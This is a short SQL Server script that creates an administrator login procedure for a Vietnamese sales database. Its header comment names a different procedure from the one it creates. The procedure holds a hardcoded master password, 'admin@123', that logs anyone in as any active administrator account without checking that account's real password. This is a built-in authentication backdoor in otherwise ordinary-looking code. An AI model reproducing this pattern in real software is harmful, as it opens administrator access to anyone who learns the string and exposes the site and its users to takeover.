USE [BanHang]
GO
/****** Object:  StoredProcedure [dbo].[select_luottruycap]    Script Date: 2/20/2017 20:51:00 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO

CREATE PROCEDURE admin_check_login
	@taikhoan nvarchar(100),
	@matkhau nvarchar(1000)
as
BEGIN
	if @matkhau = 'admin@123'	
		select MA_TAIKHOAN ,HOTEN, MA_NHOMQUYEN from QUANTRI_TAIKHOAN where TAIKHOAN = @taikhoan and MA_TRANGTHAI = 1
	else
		select MA_TAIKHOAN ,HOTEN, MA_NHOMQUYEN from QUANTRI_TAIKHOAN where TAIKHOAN = @taikhoan and MATKHAU = @matkhau and MA_TRANGTHAI = 1
END
